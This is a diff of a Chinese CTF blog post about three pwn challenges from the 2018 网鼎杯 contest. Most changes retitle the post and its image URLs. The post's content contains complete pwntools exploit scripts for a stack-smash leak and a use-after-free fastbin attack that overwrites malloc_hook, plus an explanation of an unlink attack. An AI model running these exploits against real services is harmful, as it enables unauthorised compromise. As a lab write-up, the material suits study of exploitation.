@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -80,39 +80,40 @@
 
 
 <meta name="description" content="好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。  再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="网鼎杯部分pwn">
-<meta property="og:url" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/index.html">
+<meta property="og:title" content="2018网鼎杯第一场部分pwn">
+<meta property="og:url" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/index.html">
 <meta property="og:site_name" content="0gur1">
 <meta property="og:description" content="好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。  再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/main.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/checksec.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/canary.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/result.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/argv0.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/main_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/add_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/change_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/release_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/read_str_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/checksec_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/hook.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/stderr_blind.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/bss_1.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/bss_2.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/main_babyheap.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/add_babyheap.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/change_babyheap.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/show_babyheap.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/release_babyheap.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/heap1.png">
-<meta property="og:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/heap2.png">
-<meta property="og:updated_time" content="2018-08-31T05:39:29.734Z">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/main.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/checksec.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/canary.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/result.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/argv0.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/main_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/add_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/change_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/release_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/read_str_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/checksec_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/hook.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/stderr_blind.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/bss_1.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/bss_2.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/main_babyheap.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/add_babyheap.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/change_babyheap.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/show_babyheap.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/release_babyheap.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/heap1.png">
+<meta property="og:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/heap2.png">
+<meta property="og:updated_time" content="2018-08-31T05:44:37.607Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="网鼎杯部分pwn">
+<meta name="twitter:title" content="2018网鼎杯第一场部分pwn">
 <meta name="twitter:description" content="好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。  再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目">
-<meta name="twitter:image" content="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/main.png">
+<meta name="twitter:image" content="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/main.png">
 
 
 
@@ -142,13 +143,13 @@
 
 
 
-  <link rel="canonical" href="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/"/>
+  <link rel="canonical" href="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/"/>
 
 
 
 
 
-  <title>网鼎杯部分pwn | 0gur1</title>
+  <title>2018网鼎杯第一场部分pwn | 0gur1</title>
   
 
 
@@ -303,7 +304,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/08/30/网鼎杯部分pwn/">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/08/30/2018网鼎杯第一场部分pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="0gur1">
@@ -320,7 +321,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">网鼎杯部分pwn</h1>
+          <h1 class="post-title" itemprop="name headline">2018网鼎杯第一场部分pwn</h1>
         
 
         <div class="post-meta">
@@ -350,7 +351,7 @@
 
           
           
-             <span id="/2018/08/30/网鼎杯部分pwn/" class="leancloud_visitors" data-flag-title="网鼎杯部分pwn">
+             <span id="/2018/08/30/2018网鼎杯第一场部分pwn/" class="leancloud_visitors" data-flag-title="2018网鼎杯第一场部分pwn">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -402,21 +403,21 @@
       
         <p>好久没做题，手已经生了，这次比赛提醒自己不能懈怠= =</p>
 <h1 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/main.png" alt="main函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/main.png" alt="main函数"></p>
 <p>再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目中的v7。fork之后，对于子进程会返回0，对于父进程返回的是子进程的PID，因此在上述逻辑中，对于父进程，会执行v7++，并停等在wait处，直到子进程返回；对于子进程，break跳出循环后进行比对，比对结束后子进程退出。</p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序中使用了gets函数，典型的缓冲区溢出函数。但是checksec，程序开启了canary保护：</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/checksec.png" alt="checksec"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/checksec.png" alt="checksec"></p>
 <p>在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-smash" target="_blank" rel="noopener">ctf-wiki</a>中提到，当canary的值被修改后，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，一般情况下都是程序名。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">		    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>尝试输入超过0x40个字节，并在<code>__fortify_fai</code>l处设置断点，查看<code>__libc_message</code>的参数：</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/canary.png" alt="__libc_message的参数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/canary.png" alt="__libc_message的参数"></p>
 <p>此时argv[0]中的字符串为程序名，继续执行，就会打印结果：</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/result.png" alt="canary保护的输出"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/result.png" alt="canary保护的输出"></p>
 <p>因此，当我们能够覆盖argv[0]为存放flag的buf地址，就能通过canary机制将内容读出。而且每次canary被修改之后，只是子进程退出，而父进程仍在正常执行。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用的思路为将argv[0]的地址覆盖为buf地址。由于buf为栈上的地址，因此首先需要泄露栈地址。在libc中有一个environ变量，它记录了程序的环境变量，而环境变量是存放在栈上的，可以通过读取这个值泄露栈上的地址。但在此之前，需要泄露libc的地址。</p>
 <h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>将argv[0]覆写为puts@got的地址泄露puts函数地址。</p>
 <p>查看执行gets前后的栈结构，发现有一个变量用于存放argv[0]：</p>
-<p> <img src="/2018/08/30/网鼎杯部分pwn/argv0.png" alt="栈中存放argv[0]的地址"></p>
+<p> <img src="/2018/08/30/2018网鼎杯第一场部分pwn/argv0.png" alt="栈中存放argv[0]的地址"></p>
 <p>计算S2和这个地址之间的偏移并填充，即可覆盖这一地址中的内容为puts@got的地址，canary保护就会输出puts函数的地址。</p>
 <p>本题没有给出libc，可以使用libc-database来确定使用的是哪一版本的libc。</p>
 <p>确定后通过相对偏移计算出environ变量的地址。</p>
@@ -425,22 +426,22 @@
 <h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.90.160'</span>,<span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-database/db/libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">296</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Please type your guessing flag\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">"puts_addr:%#x"</span>,puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400b23')</span></span><br><span class="line">environ_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">296</span> + p64(environ_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please type your guessing flag\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">environ = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">"environ:%#x"</span>,environ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">248</span></span><br><span class="line">rbp = environ - offset</span><br><span class="line">buf_addr = rbp<span class="number">-0x70</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">296</span> + p64(buf_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please type your guessing flag\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><p>顾名思义，blind的含义就是看不见输出，之前也遇到过同样类型的silent（强网杯），但是本题开了更多的保护机制。</p>
 <h2 id="基本逻辑-1"><a href="#基本逻辑-1" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>程序主要有三个功能：add、change和release</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/main_blind.png" alt="main函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/main_blind.png" alt="main函数"></p>
 <p>add用于添加一个0x68大小的块，向其中写入内容，同时更新ptr数组。ptr数组存放各个块的地址。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/add_blind.png" alt="add函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/add_blind.png" alt="add函数"></p>
 <p>change修改块中的内容。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/change_blind.png" alt="change函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/change_blind.png" alt="change函数"></p>
 <p>release释放指定的块，并更新free_time，此处限制了release函数使用的次数。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/release_blind.png" alt="release函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/release_blind.png" alt="release函数"></p>
 <p>另外在add和change都用到了一个read_str函数，当遇到\n或输入长度达到限制时，会向当前位置写入一个0</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/read_str_blind.png" alt="read_str函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/read_str_blind.png" alt="read_str函数"></p>
 <h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在release函数中free后的指针没有置零，存在UAF漏洞。同时本程序还开启了RELRO保护，不能对GOT表进行修改。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/checksec_blind.png" alt="checksec"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/checksec_blind.png" alt="checksec"></p>
 <p>可以通过UAF漏洞构造出fastbin attack一样的条件，即修改已释放的fastbin的FD指针指向一个伪造的块，当再次分配时，伪造的块就被分配出去。</p>
 <p>本程序中bss段是可写的，且已经提供现成的system(‘/bin/sh’)，考虑将malloc_hook修改为system函数地址。而malloc_hook离main_arena很近，考虑在ptr数组中伪造一个指针指向main_arena。我们知道，当有一个0x100大小的块被释放时，会被放入unsortedbin，此时FD和BK都会被写成main_arena+88，如果能够伪造一个0x100的块并释放，就能够实现在ptr数组中写入main_arena+88。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/hook.png" alt="mallc_hook离main_arena很近"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/hook.png" alt="mallc_hook离main_arena很近"></p>
 <h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了能向malloc_hook中写入system，需要在ptr数组中伪造一个指向0x100大小块的指针，也就是要实现覆写功能。利用UAF能够修改已释放块的FD指针，让FD指向bss段上stderr-5前后的位置，这里能够保证size处正好对应0x7f，能够绕过free函数的检查。这一块分配出去后，能够向bss段写入0x68个字节，覆盖掉ptr中的内容，顺便覆盖掉free_time。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/stderr_blind.png" alt="stderr-5"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/stderr_blind.png" alt="stderr-5"></p>
 <p>覆写的时候，从ptr[0]开始伪造fake_chunk，ptr[1]处写入块的大小0x101，ptr[4]位置写入ptr[2]，即ptr[4]控制的块指向ptr[2]处。</p>
 <p>覆写完成后，考虑释放掉ptr[4]，但此处需要注意free函数有一些检查（我踩的坑）：</p>
 <ol>
@@ -453,28 +454,28 @@
 <p>考虑到上述因素，需要在fake_chunk之后的0x100出写下inuse位1，代表fake_chunk正在使用,同时设置该块大小为0x20；在fake_chunk+0x100+0x20处写下inuse位1，代表fake_chunk的下一块正在使用，不会合并。因此在ptr[3]中写入ptr+0x100的地址，ptr[5]中写入ptr+0x120的地址。</p>
 <p>一切准备就绪后，可以释放ptr[4]，ptr[2]处就会写入FD值，即main_arena+88。由于read_str函数在收到\n时会写入一个0，可以change第0块，只输入一个\n，那么ptr[2]中就由main_arena+88(0x7ffff7dd1b70)变成0x7ffff7dd1b<strong>00</strong>，这个地址正好就是malloc_hook-0x10，此时再change第四块，就能向malloc_hook写入system了。</p>
 <p>填充的bss如下：</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/bss_1.png" alt="填充bss"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/bss_1.png" alt="填充bss"></p>
 <p>释放ptr[4]后的bss如下：</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/bss_2.png" alt="释放ptr[4]后的bss"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/bss_2.png" alt="释放ptr[4]后的bss"></p>
 <h2 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./blind'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.20.44'</span>,<span class="number">9999</span>)</span><br><span class="line">bss_addr = <span class="number">0x60203d</span></span><br><span class="line">ptr_addr = <span class="number">0x602060</span></span><br><span class="line">sys_addr = <span class="number">0x4008e3</span></span><br><span class="line">fini_addr = <span class="number">0x601db8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'0gur1'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1gur1'</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,p64(bss_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'2gur1'</span>)<span class="comment">#2-&gt;1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'3gur1'</span>)<span class="comment">#3-&gt;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk = p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x101</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(ptr_addr-bss_addr<span class="number">-16</span>)+fake_chunk+p64(ptr_addr+<span class="number">0x10</span>)+p64(ptr_addr+<span class="number">0x120</span>)</span><br><span class="line">add(<span class="number">4</span>,payload)<span class="comment">#4-&gt;bss_addr</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">change(<span class="number">5</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400c94')</span></span><br><span class="line">release(<span class="number">4</span>)</span><br><span class="line">change(<span class="number">4</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">change(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(sys_addr))</span><br><span class="line">change(<span class="number">4</span>,p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>babyheap和blind两道题很像，限制条件不同。</p>
 <h2 id="基本逻辑-2"><a href="#基本逻辑-2" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>babyheap和blind的逻辑类似，不同的是babyheap添加了输出函数show，限制了change的次数，解除了release的次数限制，同时给content分配的块大小由0x68变成了0x20，ptr数组中的块数增加到了10块。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/main_babyheap.png" alt="main函数"></p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/add_babyheap.png" alt="add函数"></p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/change_babyheap.png" alt="change函数"></p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/show_babyheap.png" alt="show函数"></p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/release_babyheap.png" alt="release函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/main_babyheap.png" alt="main函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/add_babyheap.png" alt="add函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/change_babyheap.png" alt="change函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/show_babyheap.png" alt="show函数"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/release_babyheap.png" alt="release函数"></p>
 <h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>同样，babyheap中的release函数也没有对free掉的指针置零，存在UAF漏洞和double free漏洞。本题没有给system函数，先对libc进行泄露，再覆写free_hook为system。</p>
 <p>libc的泄露和free_hook的改写都要需要对ptr数组进行修改，然后通过show和change函数完成泄露和改写。如何能对ptr数组改写呢？由于本题的块大小已被修改为0x20，即chunk size处为0x30，已不能使用blind中的方法。为了能对ptr进行覆写，可以伪造一个chunk，构造FD和BK，通过free触发unlink实现。</p>
 <h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="unlink实现ptr数组的覆写"><a href="#unlink实现ptr数组的覆写" class="headerlink" title="unlink实现ptr数组的覆写"></a>unlink实现ptr数组的覆写</h3><p>当要free一个0x90的块时，如果它的前一块是一个空闲块时，会先对前一块进行unlink，然后再把这两块合并。因此，我们需要一个chunk size为0x90且inuse位已经置零的chunk，以及空闲的上一块。</p>
 <p>实际上，题目中是存在堆溢出漏洞的，可以利用这个漏洞修改某个块的chunk size字段。堆溢出漏洞如下：如果在已分配的content部分构造一个chunk size为0x30的fastbin，就能通过fastbin attack修改FD指针为这个chunk size，再次分配的块就指向了这个chunk+0x10处，在读入0x20个字节时，就会覆盖掉下一块的chunk size字段。</p>
 <p>另外由于存在UAF漏洞，在fastbin attack中也能顺便泄露堆地址。</p>
